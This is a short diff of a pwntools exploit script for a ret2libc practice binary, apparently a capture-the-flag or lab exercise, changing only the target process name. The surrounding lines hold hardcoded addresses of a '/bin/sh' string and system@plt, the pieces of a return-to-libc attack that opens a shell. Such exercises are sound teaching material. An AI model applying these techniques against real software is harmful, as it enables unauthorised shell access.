@@ -1,6 +1,6 @@
 from pwn import *
 
-sh = process('./ret2libc1')
+sh = process('./ret2libc')
 
 binsh_addr = 0x8048720
 system_plt = 0x08048460
